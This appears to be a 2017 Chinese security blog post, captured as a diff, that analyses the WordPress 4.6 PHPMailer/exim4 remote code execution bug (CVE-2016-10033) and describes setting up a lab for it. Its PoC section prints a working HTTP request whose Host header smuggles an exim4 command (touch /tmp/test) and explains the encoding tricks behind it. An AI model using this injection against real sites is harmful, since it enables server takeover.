@@ -1,0 +1,1321 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="eOKt_3ycRCL7ILr4F1AM1eilrWXcADidutENpULFpsE" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="poc,WordPress,远程代码执行,VirtualHost,exim4,phpmail," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xxlegend" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="背景当地时间5月3日（北京时间5月4日凌晨），WordPress被曝出存在严重的安全隐患。一则关于漏洞CVE-2016-10033的新POC被爆出。这是一个PHPMailer的漏洞，WordPress 4.6使用了存在该漏洞的PHPMailer，出于安全考虑，WordPress官方在4.7.1中更新了PHPMailer，解决了这个问题。但PHPMailer漏洞的原作者，又发现了一个针对PHPMai">
+<meta name="keywords" content="poc,WordPress,远程代码执行,VirtualHost,exim4,phpmail">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WordPress远程代码执行环境构造和VirtualHost环境验证">
+<meta property="og:url" content="http://xxlegend.com/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/index.html">
+<meta property="og:site_name" content="xxlegend">
+<meta property="og:description" content="背景当地时间5月3日（北京时间5月4日凌晨），WordPress被曝出存在严重的安全隐患。一则关于漏洞CVE-2016-10033的新POC被爆出。这是一个PHPMailer的漏洞，WordPress 4.6使用了存在该漏洞的PHPMailer，出于安全考虑，WordPress官方在4.7.1中更新了PHPMailer，解决了这个问题。但PHPMailer漏洞的原作者，又发现了一个针对PHPMai">
+<meta property="og:updated_time" content="2017-05-05T01:43:57.327Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WordPress远程代码执行环境构造和VirtualHost环境验证">
+<meta name="twitter:description" content="背景当地时间5月3日（北京时间5月4日凌晨），WordPress被曝出存在严重的安全隐患。一则关于漏洞CVE-2016-10033的新POC被爆出。这是一个PHPMailer的漏洞，WordPress 4.6使用了存在该漏洞的PHPMailer，出于安全考虑，WordPress官方在4.7.1中更新了PHPMailer，解决了这个问题。但PHPMailer漏洞的原作者，又发现了一个针对PHPMai">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://xxlegend.com/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/"/>
+
+
+
+
+
+  <title>WordPress远程代码执行环境构造和VirtualHost环境验证 | xxlegend</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ae110488ae3a7a2872b00e735070cfbc";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xxlegend</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                WordPress远程代码执行环境构造和VirtualHost环境验证
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-05T09:41:26+08:00">
+                2017-05-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/" class="leancloud_visitors" data-flag-title="WordPress远程代码执行环境构造和VirtualHost环境验证">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>当地时间5月3日（北京时间5月4日凌晨），WordPress被曝出存在严重的安全隐患。一则关于漏洞CVE-2016-10033的新POC被爆出。这是一个PHPMailer的漏洞，WordPress 4.6使用了存在该漏洞的PHPMailer，出于安全考虑，WordPress官方在4.7.1中更新了PHPMailer，解决了这个问题。但PHPMailer漏洞的原作者，又发现了一个针对PHPMailer在使用exim4 MTA时的利用方法。新POC的曝出也表示着WordPress 4.6版本均受影响。<br><a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="external">rce 原始出处</a><br>    这里面的核心点就是作者提供了可用的针对WordPress的利用方法，利用的攻击向量就是exim4 MTA.</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>本文作者直接用的Ubuntu 14.04，WordPress 4.6，其他都是通过apt-get安装搭建的环境。我看有童鞋通过docker这种方式来搭建环境，遇到的坑实在太多，可以参考下这个。简单示例下：<br>由于是利用的exim4 MTA的攻击向量，这在Ubuntu14.04是默认不存在的。</p>
+<h2 id="安装exim4"><a href="#安装exim4" class="headerlink" title="安装exim4"></a>安装exim4</h2><p>通过<code>apt-get install exim4</code>直接安装,安装完的效果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">liaoxinxi@ubuntu:/var/www/WordPress-4.6$ ls -al /usr/sbin/sendmail</div><div class="line">lrwxrwxrwx 1 root root 5 Jan  5 23:10 /usr/sbin/sendmail -&gt; exim4</div><div class="line">liaoxinxi@ubuntu:/var/www/WordPress-4.6$ sudo netstat -anp|grep <span class="string">":25"</span></div><div class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1683/exim4</div><div class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      1683/exim4</div></pre></td></tr></table></figure>
+<p>apt-get安装完会在系统建立sendmail的软连接，这个软连接直接指向了exim4，当然也就不需要再安装sendmail了。安装完之后会在系统的25号端口建立监听。</p>
+<h2 id="安装Mysql，设置数据库"><a href="#安装Mysql，设置数据库" class="headerlink" title="安装Mysql，设置数据库"></a>安装Mysql，设置数据库</h2><p>接下来就是wordpress的安装，这个网上的文章很多，看权威文档即可，下面是记录文档。<br>数据库的安装，本来系统有个mysql数据库，但是忘记root密码，试了好多遍，好吧，只能卸载了重装，这个卸载的一定得把数据清除了，不然root密码还是原来的。附安装脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 sudo apt-get install mysql-server</div><div class="line">2 sudo apt-get install mysql-client</div><div class="line">3 sudo apt-get install  php5-mysqlnd-ms</div></pre></td></tr></table></figure>
+<p>在装数据库的时候会弹出让你填入root用户名和密码，直接写入就可以，记得后续得用到<br>创建数据库表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE DATABASE wp_myblog;</div><div class="line">mysql&gt; GRANT ALL PRIVILEGES ON wp_myblog.* TO <span class="string">'wordpress'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'wordpress'</span>;</div><div class="line">mysql&gt; FLUSH PRIVILEGES;</div><div class="line">mysql&gt; EXIT;</div></pre></td></tr></table></figure>
+<h2 id="配置Apache"><a href="#配置Apache" class="headerlink" title="配置Apache"></a>配置Apache</h2><p>解压WordPress的zip包到web目录，设置apache2配置文件。WordPress 4.6的下载地址：<a href="https://github.com/WordPress/WordPress/archive/4.6.zip，" target="_blank" rel="external">https://github.com/WordPress/WordPress/archive/4.6.zip，</a><br>apach2的简单配置如下,就是设置DocumentRoot指向刚才解压后WordPress的路径：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">vi /etc/apache2/sites-enabled/000-default.conf</div><div class="line"></div><div class="line"> 35 &lt;VirtualHost *:80&gt;</div><div class="line"> 36     <span class="comment"># The ServerName directive sets the request scheme, hostname and port that</span></div><div class="line"> 37     <span class="comment"># the server uses to identify itself. This is used when creating</span></div><div class="line"> 38     <span class="comment"># redirection URLs. In the context of virtual hosts, the ServerName</span></div><div class="line"> 39     <span class="comment"># specifies what hostname must appear in the request's Host: header to</span></div><div class="line"> 40     <span class="comment"># match this virtual host. For the default virtual host (this file) this</span></div><div class="line"> 41     <span class="comment"># value is not decisive as it is used as a last resort host regardless.</span></div><div class="line"> 42     <span class="comment"># However, you must set it for any further virtual host explicitly.</span></div><div class="line"> 43     <span class="comment">#ServerName www.example.com</span></div><div class="line"> 44     ServerName www.a.com</div><div class="line"> 46     DocumentRoot /var/www/WordPress-4.6/</div></pre></td></tr></table></figure>
+<h2 id="配置WordPress-wp-config"><a href="#配置WordPress-wp-config" class="headerlink" title="配置WordPress wp-config"></a>配置WordPress wp-config</h2><p>编辑wp-config.php，首先<code>sudo cp wp-config-sample.php wp-config.php</code>,修改如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">23 define(&apos;DB_NAME&apos;, &apos;wp_myblog&apos;);</div><div class="line">24</div><div class="line">25 /** MySQL database username */</div><div class="line">26 define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</div><div class="line">27</div><div class="line">28 /** MySQL database password */</div><div class="line">29 define(&apos;DB_PASSWORD&apos;, &apos;wordpress&apos;);</div></pre></td></tr></table></figure>
+<h2 id="重启进程"><a href="#重启进程" class="headerlink" title="重启进程"></a>重启进程</h2><p>最后重启数据库，apache2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/apache2 restart</div><div class="line">sudo/etc/init.d/mysql start</div></pre></td></tr></table></figure>
+<p>重启完之后访问我们的设置的IP或者域名，按照提示一步步设置即可。不过得记住具体设置的用户名或者email地址，这个在后续的poc中会用到。</p>
+<h1 id="VirtualHost-环境验证"><a href="#VirtualHost-环境验证" class="headerlink" title="VirtualHost 环境验证"></a>VirtualHost 环境验证</h1><p>在实际的应用中，很多时候都会用到VirtualHost来配置主机和域名的对应关系，在原作者的payload也提到了是利用了默认的Apache2配置，那么不是默认的Apache2配置呢？设置了ServerName的这种情况呢？经测试发现，不修改Poc的话，直接访问该IP，Apache会将请求交给第一个VirtualHost处理。<br>那如果修改Poc呢，笔者尝试修改完之后能达到访问任意VirtualHost环境，这就避免了原作者必须利用默认配置的情况，这样的话这个漏洞的威力又大了一成。下面附上设置的VirtualHost环境，大家可以尝试修改试试，这个针对带多个VirtualHost的poc暂时先不公布，大家可以先仔细测测,肯定是可以的，笔者的环境中WordPress即不在第一个VirtualHost上，也是能被攻击的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:80&gt;</div><div class="line">    ServerAdmin webmaster@localhost</div><div class="line">    ServerName www.b.com</div><div class="line">    DocumentRoot /var/www/DVWA-1.9</div><div class="line">    ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</div><div class="line">    CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</div><div class="line"></div><div class="line">&lt;/VirtualHost&gt;</div><div class="line">&lt;VirtualHost *:80&gt;</div><div class="line">    ServerName www.a.com</div><div class="line">    DocumentRoot /var/www/WordPress-4.6/</div><div class="line">    ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error1.log</div><div class="line">    CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access1.log combined</div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure>
+<h1 id="poc-简单解读"><a href="#poc-简单解读" class="headerlink" title="poc 简单解读"></a>poc 简单解读</h1><p>这个解读会比较简单，大家可以参考原作者公布的<a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="external">blog</a>,真是不得不服人家，写的有理有据，包括怎么发现的，参考的文档，怎么绕过的，一步步的绕过历程都写得清清楚，值得细读。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /wp-login.php?action=lostpassword HTTP/1.1</div><div class="line">Host: xenial(tmp1 -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test&#125;&#125;  tmp2)</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 64</div><div class="line"></div><div class="line">user_login=wordpress&amp;redirect_to=&amp;wp-submit=Get+New+Password</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Found</div><div class="line">Date: Thu, 04 May 2017 07:37:15 GMT</div><div class="line">Server: Apache/2.4.7 (Ubuntu)</div><div class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.21</div><div class="line">Expires: Wed, 11 Jan 1984 05:00:00 GMT</div><div class="line">Cache-Control: no-cache, must-revalidate, max-age=0</div><div class="line">Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/</div><div class="line">X-Frame-Options: SAMEORIGIN</div><div class="line">Location: wp-login.php?checkemail=confirm</div><div class="line">Content-Length: 0</div><div class="line">Connection: close</div><div class="line">Content-Type: text/html; charset=UTF-8</div></pre></td></tr></table></figure>
+<p>原作者主要是利用了Host中可以包含注释来夹带私货，来绕过域名中不能包含空格的问题（注释中域名部分可带空格来分割sendmail的参数），在WordPress中filter_var/FILTER_VALIDATE_EMAIL中和PHPMailer library库中validateAddress(）都是参考的<a href="https://www.ietf.org/rfc/rfc822.txt" target="_blank" rel="external">RFC 822</a>，实现都是一样的。一个简单的注释示例如<code>john@example.com(comment)</code>,而且域名部分可以包含空格。这就可以将参数传递到sendmail的第五个，第六个参数。为了绕过不能/的问题，作者尝试了perl，base64/hex，最终选定了substr来提取exim4自带的默认参数，<code>${substr{0}{1}{$spool_directory}</code> 来替代 用 <code>/</code>,${substr{10}{1}{$tod_log}} 来替代空格，这样就可以搞定一个命令执行。其实exim中涉及的变量还挺多，还有些是可以利用的。<code>/usr/bin/touch /tmp/test</code>,对于上面提供的poc得注意user_login必须是存在的，这个也在文章中设置wordpress的时候提到过，可以是用户名或者邮箱,提供的不对的话会报用户不存在的错误。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/poc/" rel="tag"># poc</a>
+          
+            <a href="/tags/WordPress/" rel="tag"># WordPress</a>
+          
+            <a href="/tags/远程代码执行/" rel="tag"># 远程代码执行</a>
+          
+            <a href="/tags/VirtualHost/" rel="tag"># VirtualHost</a>
+          
+            <a href="/tags/exim4/" rel="tag"># exim4</a>
+          
+            <a href="/tags/phpmail/" rel="tag"># phpmail</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/" rel="next" title="fastjson 远程反序列化poc的构造和分析">
+                <i class="fa fa-chevron-left"></i> fastjson 远程反序列化poc的构造和分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="廖新喜" />
+          <p class="site-author-name" itemprop="name">廖新喜</p>
+           
+              <p class="site-description motion-element" itemprop="description">分享些安全编码，漏洞分析</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">18</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">70</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/shengqi158" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/shengqi158" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1900013681" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装exim4"><span class="nav-number">2.1.</span> <span class="nav-text">安装exim4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装Mysql，设置数据库"><span class="nav-number">2.2.</span> <span class="nav-text">安装Mysql，设置数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置Apache"><span class="nav-number">2.3.</span> <span class="nav-text">配置Apache</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置WordPress-wp-config"><span class="nav-number">2.4.</span> <span class="nav-text">配置WordPress wp-config</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#重启进程"><span class="nav-number">2.5.</span> <span class="nav-text">重启进程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VirtualHost-环境验证"><span class="nav-number">3.</span> <span class="nav-text">VirtualHost 环境验证</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#poc-简单解读"><span class="nav-number">4.</span> <span class="nav-text">poc 简单解读</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">廖新喜</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
